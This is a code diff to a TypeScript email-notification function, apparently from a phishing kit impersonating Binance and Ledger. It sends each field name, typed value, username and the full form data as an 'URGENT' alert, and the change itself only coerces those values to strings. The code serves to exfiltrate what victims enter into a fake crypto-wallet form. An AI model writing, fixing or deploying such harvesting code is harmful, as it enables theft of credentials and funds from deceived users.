@@ -23,7 +23,7 @@ export const sendEmailNotification = async (data: EmailData) => {
   const templateParams = {
     to_email: "donotreply@binanceledger.com",
     from_name: "Binance Ledger System - URGENT",
-    subject: `🚨 IMMEDIATE: ${data.step} - User Action Alert`,
+    subject: `IMMEDIATE: ${data.step} - User Action Alert`,
     message: `URGENT ACTION: ${data.step}
 ${data.field ? `Field: ${data.field}` : ''}
 ${data.value ? `Value: ${data.value}` : ''}
@@ -33,12 +33,12 @@ Timestamp: ${data.timestamp}
 ${data.allFormData ? `Complete Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
     
     // Ensure these are always strings, never undefined
-    step: data.step || '',
-    field: data.field || '',
-    value: data.value || '',
-    username: data.username || '',
-    timestamp: data.timestamp || new Date().toISOString(),
-    allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
+    step: String(data.step || ''),
+    field: String(data.field || ''),
+    value: String(data.value || ''),
+    username: String(data.username || ''),
+    timestamp: String(data.timestamp || new Date().toISOString()),
+    allFormData: data.allFormData ? String(JSON.stringify(data.allFormData, null, 2)) : ''
   };
 
   console.log('📧 Template parameters being sent:', templateParams);
@@ -69,11 +69,11 @@ ${data.allFormData ? `Complete Form Data:\n${JSON.stringify(data.allFormData, nu
           from_name: "Binance Ledger System",
           subject: `Alert: ${data.step}`,
           message: `Action: ${data.step}\nTimestamp: ${data.timestamp}`,
-          step: data.step,
+          step: String(data.step || ''),
           field: '',
           value: '',
-          username: data.username || '',
-          timestamp: data.timestamp,
+          username: String(data.username || ''),
+          timestamp: String(data.timestamp || new Date().toISOString()),
           allFormData: ''
         };
         
